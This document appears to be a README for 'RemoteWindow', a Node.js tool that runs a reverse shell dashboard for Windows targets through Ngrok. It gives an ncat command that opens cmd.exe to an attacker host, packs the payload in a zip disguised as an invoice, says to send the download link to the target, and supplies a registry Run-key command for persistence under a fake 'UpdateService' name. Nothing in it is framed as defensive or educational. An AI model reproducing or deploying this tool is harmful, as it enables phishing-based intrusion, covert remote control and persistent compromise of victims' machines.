# RemoteWindow - Reverse Shell Dashboard

## Overview

A Node.js-based reverse shell tool using `ncat.exe`. It provides a web dashboard to control target machines via a WebSocket connection tunneled through Ngrok.

## Prerequisites

- **Attacker Machine**: Windows/Linux/Mac with Node.js installed.
- **Target Machine**: Windows.
- **Tools**:
  - `ncat.exe` (from Nmap)
  - `run.bat` (Reverse shell script)
  - Ngrok (for tunneling)
  - Vercel (for frontend hosting)

## Quick Start Guide

### 1. Prepare the Payload

1.  Ensure `Invoice_Q3.zip` contains:
    - `ncat.exe`
    - `run.bat` (Content: `ncat.exe <NGROK_IP> 4444 -e cmd.exe`)
2.  Host the zip file on Vercel or any static host.

### 2. Local Backend Setup

1.  Open terminal in the project root.
2.  Install dependencies:
    ```bash
    npm install
    ```
3.  Start the server:
    ```bash
    node server.js
    ```

### 3. Tunneling (Ngrok)

1.  Run Ngrok to expose port 3000:
    ```bash
    ngrok http 3000
    ```
2.  Copy the HTTPS URL (e.g., `https://abc123.ngrok.io`).

### 4. Frontend Configuration

1.  Edit `script.js`:
    ```javascript
    const ws = new WebSocket("wss://abc123.ngrok.io/ws"); // Replace with your Ngrok URL
    ```
2.  Deploy the frontend to Vercel.

### 5. Execution

1.  Send the download link to the target.
2.  Target runs `run.bat`.
3.  Connect via the dashboard.

## Persistence

To make the payload survive reboots, run this on the target:

```cmd
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v UpdateService /t REG_SZ /d "C:\Users\USER\Downloads\Invoice_Q3\payload\run.bat" /f
```
